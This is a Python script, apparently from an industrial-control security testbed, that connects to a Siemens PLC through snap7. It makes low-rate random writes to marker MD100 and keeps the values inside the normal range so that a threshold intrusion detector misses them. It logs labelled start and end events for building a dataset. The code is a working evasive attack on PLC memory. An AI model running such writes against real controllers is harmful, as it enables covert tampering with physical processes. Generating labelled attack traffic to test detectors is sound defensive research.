"""
STEALTHY_LOW_RATE_MARKER_WRITE
Ghi nhe tan suat thap vao vung Marker thu nghiem.
Gia tri trong nguong hop le -> threshold IDS bo qua.

Goi tu bash:
  python -m attacks_ext.stealthy_write \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
import random
from attacks_ext.config_ext import base_parser, write_label

TEST_MARKER = 100
NORMAL_MIN = 900
NORMAL_MAX = 1100


def clamp(value):
    if value < NORMAL_MIN:
        return NORMAL_MIN + abs(value) % (NORMAL_MAX - NORMAL_MIN)
    if value > NORMAL_MAX:
        return NORMAL_MAX - abs(value) % (NORMAL_MAX - NORMAL_MIN)
    return value


def run(args):
    label_prefix = "STEALTHY_WRITE"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    import snap7
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import get_dint, set_dint

    client = snap7.client.Client()
    write_count = 0

    try:
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Connected. Low-rate write to MD{TEST_MARKER}...")

        current = get_dint(client.read_area(Areas.MK, 0, TEST_MARKER, 4), 0)
        baseline = current if NORMAL_MIN <= current <= NORMAL_MAX else 1000
        if current != baseline:
            buf = bytearray(4)
            set_dint(buf, 0, baseline)
            client.write_area(Areas.MK, 0, TEST_MARKER, buf)
            print(f"[*] MD{TEST_MARKER} {current} -> {baseline} (set to normal)")

        end_time = time.time() + args.duration
        while time.time() < end_time:
            current = get_dint(client.read_area(Areas.MK, 0, TEST_MARKER, 4), 0)
            new_val = clamp(current + random.choice([-12, -8, 8, 12]))
            buf = bytearray(4)
            set_dint(buf, 0, new_val)
            client.write_area(Areas.MK, 0, TEST_MARKER, buf)
            write_count += 1
            print(f"  [{write_count}] MD{TEST_MARKER} {current} -> {new_val}")
            time.sleep(random.uniform(8, 15))

        buf = bytearray(4)
        set_dint(buf, 0, baseline)
        client.write_area(Areas.MK, 0, TEST_MARKER, buf)
        print(f"[*] Restored MD{TEST_MARKER} = {baseline}")

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if client.get_connected():
            client.disconnect()
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"writes={write_count} target=MD{TEST_MARKER}")


def main():
    p = base_parser("Stealthy Low-Rate Marker Write")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
